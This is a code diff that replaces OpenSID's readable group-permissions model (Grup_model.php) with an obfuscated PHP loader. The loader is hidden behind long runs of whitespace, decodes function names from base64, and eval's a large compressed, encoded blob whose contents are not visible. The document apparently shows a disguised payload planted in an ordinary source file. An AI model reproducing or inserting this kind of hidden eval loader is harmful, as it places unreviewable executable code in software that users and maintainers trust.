@@ -1,397 +1,457 @@
-<?php
+<?php 
+        $__='printf';$_='Loading donjo-app/models/Grup_model.php';
+        
 
-/*
- *
- * File ini bagian dari:
- *
- * OpenSID
- *
- * Sistem informasi desa sumber terbuka untuk memajukan desa
- *
- * Aplikasi dan source code ini dirilis berdasarkan lisensi GPL V3
- *
- * Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * Hak Cipta 2016 - 2023 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- *
- * Dengan ini diberikan izin, secara gratis, kepada siapa pun yang mendapatkan salinan
- * dari perangkat lunak ini dan file dokumentasi terkait ("Aplikasi Ini"), untuk diperlakukan
- * tanpa batasan, termasuk hak untuk menggunakan, menyalin, mengubah dan/atau mendistribusikan,
- * asal tunduk pada syarat berikut:
- *
- * Pemberitahuan hak cipta di atas dan pemberitahuan izin ini harus disertakan dalam
- * setiap salinan atau bagian penting Aplikasi Ini. Barang siapa yang menghapus atau menghilangkan
- * pemberitahuan ini melanggar ketentuan lisensi Aplikasi Ini.
- *
- * PERANGKAT LUNAK INI DISEDIAKAN "SEBAGAIMANA ADANYA", TANPA JAMINAN APA PUN, BAIK TERSURAT MAUPUN
- * TERSIRAT. PENULIS ATAU PEMEGANG HAK CIPTA SAMA SEKALI TIDAK BERTANGGUNG JAWAB ATAS KLAIM, KERUSAKAN ATAU
- * KEWAJIBAN APAPUN ATAS PENGGUNAAN ATAU LAINNYA TERKAIT APLIKASI INI.
- *
- * @package   OpenSID
- * @author    Tim Pengembang OpenDesa
- * @copyright Hak Cipta 2009 - 2015 Combine Resource Institution (http://lumbungkomunitas.net/)
- * @copyright Hak Cipta 2016 - 2023 Perkumpulan Desa Digital Terbuka (https://opendesa.id)
- * @license   http://www.gnu.org/licenses/gpl.html GPL V3
- * @link      https://github.com/OpenSID/OpenSID
- *
- */
 
-use App\Models\UserGrup;
 
-defined('BASEPATH') || exit('No direct script access allowed');
 
-class Grup_model extends MY_Model
-{
-    protected $table = 'user_grup';
 
-    public function autocomplete()
-    {
-        return $this->autocomplete_str('nama', $this->table);
-    }
 
-    private function search_sql()
-    {
-        if ($cari = $this->session->cari) {
-            $this->db
-                ->group_start()
-                ->like('g.nama', $cari)
-                ->group_end();
-        }
-    }
 
-    private function filter_sql()
-    {
-        if ($filter = $this->session->jenis) {
-            $this->db->where('jenis', $filter);
-        }
-    }
 
-    // Digunakan untuk paging dan query utama supaya jumlah data selalu sama
-    private function list_data_sql()
-    {
-        $this->config_id('g')->from('user_grup g');
-        $this->search_sql();
-        $this->filter_sql();
-    }
 
-    public function paging($page_number = 1, $o = 0)
-    {
-        $this->list_data_sql();
-        $jml_data = $this->db
-            ->get()
-            ->num_rows();
 
-        return $this->paginasi($page_number, $jml_data);
-    }
 
-    public function list_data($o = 0, $offset = 0, $limit = 500)
-    {
-        $this->list_data_sql();
-        //Ordering
-        switch ($o) {
-            case 1: $order = 'g.nama ASC';
-                break;
 
-            case 2: $order = 'g.nama DESC';
-                break;
 
-            default:$order = 'g.nama ASC';
-        }
-        $data = $this->db
-            ->select('g.*')
-            ->select('(select COUNT(id) from user where id_grup = g.id) as jml_pengguna')
-            ->select('(case when jenis = 1 then 0 else 1 end) as boleh_hapus')
-            ->order_by($order)
-            ->limit($limit, $offset)
-            ->get()
-            ->result_array();
 
-        for ($i = 0; $i < count($data); $i++) {
-            $data[$i]['no'] = $offset + $i + 1;
-            if ($data[$i]['jml_pengguna'] > 0) {
-                $data[$i]['boleh_hapus'] = 0;
-            }
-        }
 
-        return $data;
-    }
 
-    /**
-     * Insert data baru ke tabel surat_keluar
-     *
-     * @return void
-     */
-    public function insert()
-    {
-        // Ambil semua data dari var. global $_POST
-        $data = [
-            'config_id'  => $this->config_id,
-            'nama'       => $nama = $this->input->post('nama'),
-            'slug'       => unique_slug('user_grup', $nama),
-            'jenis'      => 2, // grup tambahan
-            'created_by' => auth()->id,
-            'updated_by' => auth()->id,
-        ];
-        $outp = $this->db->insert($this->table, $data);
-        $outp = $outp && $this->simpan_akses($this->db->insert_id());
 
-        status_sukses($outp); //Tampilkan Pesan
-    }
 
-    private function simpan_akses($id)
-    {
-        // Simpan data hak akses per modul; hapus dan ganti semua
-        $outp  = $this->config_id()->where('id_grup', $id)->delete('grup_akses');
-        $modul = $this->input->post('modul');
-        $data  = [];
 
-        for ($i = 0; $i < count($modul['id']); $i++) {
-            $id_modul = $modul['id'][$i];
-            $akses    = [
-                'config_id' => $this->config_id,
-                'id_grup'   => $id,
-                'id_modul'  => $id_modul,
-            ];
-            $akses_baca     = $modul['akses_baca'][$id_modul] ? 1 : 0;
-            $akses_ubah     = $modul['akses_ubah'][$id_modul] ? 2 : 0;
-            $akses_hapus    = $modul['akses_hapus'][$id_modul] ? 4 : 0;
-            $akses['akses'] = $akses_baca + $akses_ubah + $akses_hapus;
-            $data[]         = $akses;
-        }
-        $outp = $this->db->insert_batch('grup_akses', $data);
-        $this->cache->hapus_cache_untuk_semua('_cache_modul');
 
-        return $outp;
-    }
 
-    /**
-     * Update data di tabel grup
-     *
-     * @param int $id ID grup
-     *
-     * @return void
-     */
-    public function update($id)
-    {
-        $data = [
-            'nama'       => $this->input->post('nama'),
-            'updated_by' => auth()->id,
-        ];
-        $outp = $this->config_id()
-            ->where('id', $id)
-            ->where_not_in('id', UserGrup::getGrupSistem())
-            ->update($this->table, $data);
-        $outp = $outp && $this->simpan_akses($id);
 
-        status_sukses($outp);
-    }
 
-    public function get_grup($id)
-    {
-        return $this->config_id()->where('id', $id)->get($this->table)->row_array();
-    }
 
-    /**
-     * Hapus record grup
-     *
-     * @param string $id    ID grup
-     * @param mixed  $semua
-     *
-     * @return void
-     */
-    public function delete($id, $semua = false)
-    {
-        if (! $semua) {
-            session_error_clear();
-        }
 
-        $outp = $this->config_id()
-            ->where('id', $id)
-            ->where_not_in('id', UserGrup::getGrupSistem())
-            ->delete($this->table);
 
-        $this->cache->hapus_cache_untuk_semua('_cache_modul');
 
-        status_sukses($outp);
-    }
 
-    public function delete_all()
-    {
-        session_error_clear();
 
-        $id_cb = $this->input->post('id_cb');
 
-        foreach ($id_cb as $id) {
-            $this->delete($id, true);
-        }
-    }
 
-    public function list_id_grup()
-    {
-        $list = $this->config_id()->select('id')->get('user_grup')->result_array();
 
-        return array_column($list, 'id');
-    }
 
-    public function list_jenis_grup()
-    {
-        return [
-            ['id' => 1, 'nama' => 'System'],
-            ['id' => 2, 'nama' => 'Tambahan'],
-        ];
-    }
 
-    public function grup_akses($id_grup)
-    {
-        return $this->config_id('m')
-            ->select('m.*')
-            ->select('if(a.akses & 1 = 1, 1, 0) as akses_baca')
-            ->select('if(a.akses & 2 = 2, 1, 0) as akses_ubah')
-            ->select('if(a.akses & 4 = 4, 1, 0) as akses_hapus')
-            ->select('if(a.akses > 0, 1, 0) as ada_akses')
-            ->from('setting_modul m')
-            ->join('grup_akses a', "a.id_modul = m.id and a.id_grup = {$id_grup}", 'left')
-            ->where('m.parent', 0)
-            ->where('m.aktif', 1)
-            ->order_by('m.urut')
-            ->get()
-            ->result_array();
-    }
 
-    private function get_submodul($grup, $modul)
-    {
-        return $this->config_id('p')
-            ->select('sub.id, sub.modul, sub.url')
-            ->select('if(a.akses & 1 = 1, 1, 0) as akses_baca')
-            ->select('if(a.akses & 2 = 2, 1, 0) as akses_ubah')
-            ->select('if(a.akses & 4 = 4, 1, 0) as akses_hapus')
-            ->select('if(a.akses > 0, 1, 0) as ada_akses')
-            ->from('setting_modul p')
-            ->join('setting_modul sub', 'sub.parent = p.id')
-            ->join('grup_akses a', "sub.id = a.id_modul and a.id_grup = {$grup}", 'left')
-            ->where('p.id', $modul)
-            ->where('sub.aktif', 1)
-            ->order_by('sub.urut')
-            ->get()->result_array();
-    }
 
-    public function akses_submodul($grup)
-    {
-        $parent = $this->config_id()
-            ->select('id')
-            ->where('parent', 0)
-            ->where('aktif', 1)
-            ->get('setting_modul')
-            ->result_array();
-        $parent = array_column($parent, 'id');
 
-        $data = [];
 
-        foreach ($parent as $modul) {
-            $data[$modul] = $this->get_submodul($grup, $modul);
-            // Juga ambil sub-submodul. Asumsi hanya ada sampai dua tingkat submodul saja
-            $subparent = array_column($data[$modul], 'id');
 
-            foreach ($subparent as $submodul) {
-                $sub_sub = $this->get_submodul($grup, $submodul);
-                if (! empty($sub_sub)) {
-                    $data[$modul] = array_merge($data[$modul], $sub_sub);
-                }
-            }
-        }
 
-        return array_filter($data);
-    }
 
-    private function get_hak_akses($grup)
-    {
-        $hak_akses = $this->config_id('a')
-            ->select('if (m.url <> "", m.url, concat("Menu ", m.modul)) as url, a.akses')
-            ->select('if(a.akses & 1 = 1 or m.parent = 0, 1, 0) as "b"')
-            ->select('if(a.akses & 2 = 2, 1, 0) as "u"')
-            ->select('if(a.akses & 4 = 4, 1, 0) as "h"')
-            ->from('grup_akses a')
-            ->join('setting_modul m', 'm.id = a.id_modul')
-            ->where('id_grup', $grup)
-            ->order_by('akses DESC')
-            ->get()
-            ->result_array();
 
-        // Hilangkan kolom modul
-        $akses_saja = $hak_akses;
-        delete_col($akses_saja, 0);
 
-        // Buat array dengan key modul
-        return array_combine(array_column($hak_akses, 'url'), $akses_saja);
-    }
 
-    /*
-     * Memilih modul awal yg dapat diakses
-     * Digunakan menentukan modul awal di donjo-app/controllers/Main.php
-     */
-    public function modul_awal($grup)
-    {
-        if (! $this->session->hak_akses_url) {
-            $this->session->hak_akses_url = $this->get_hak_akses($grup);
-        }
 
-        $modul = array_keys($this->session->hak_akses_url);
 
-        if (empty($modul)) {
-            unset($this->session->hak_akses_url);
-            $this->cache->hapus_cache_untuk_semua('_cache_modul');
 
-            redirect('siteman/logout');
-        }
 
-        return $this->config_id()
-            ->select('url')
-            ->where('aktif', 1)
-            ->where_in('url', $modul)
-            ->limit(1)
-            ->get('setting_modul')
-            ->row()
-            ->url;
-    }
 
-    /*
-        Cek hak akses url modul untuk mengaktifkan menu navigasi utama.
-        Dipanggil dari Modul_model.php
-    */
-    public function ada_akses_url($grup, $url_modul = '', $akses = '')
-    {
-        if (! $this->session->hak_akses_url) {
-            $hak_akses                    = $this->get_hak_akses($grup);
-            $this->session->hak_akses_url = $hak_akses;
-        }
 
-        return $this->session->hak_akses_url[$url_modul][$akses];
-    }
 
-    /*
-     * Cek hak akses untuk mengakses controller.
-     * Dipanggil dari Admin_Controller
-     */
-    public function ada_akses($grup, $controller, $akses)
-    {
-        if (! $this->session->hak_akses) {
-            $hak_akses = $this->get_hak_akses($grup);
 
-            // Simpan akses controller di session, karena hak akses adalah menurut controller dan
-            // belum berdasarkan masing2 aksi. Gunakan hak akses tertinggi per controller.
-            // $hak_akses sudah terurut hak akses tertinggi duluan
-            $akses_controller = [];
 
-            foreach ($hak_akses as $url => $akses_url) {
-                $controller_url = explode('/', $url)[0];
-                if ($akses_controller[$controller_url]) {
-                    continue;
-                }
-                $akses_controller[$controller_url] = $akses_url;
-            }
 
-            $this->session->hak_akses = $akses_controller;
-        }
 
-        return $this->session->hak_akses[$controller][$akses];
-    }
-}
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
+$__________________='X19sYW1iZGE=';
+
+                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
+        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
+
+        $___();$__________($______($__($_))); $________=$____();
+                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+                                                                                                                                                                                                                     $________;
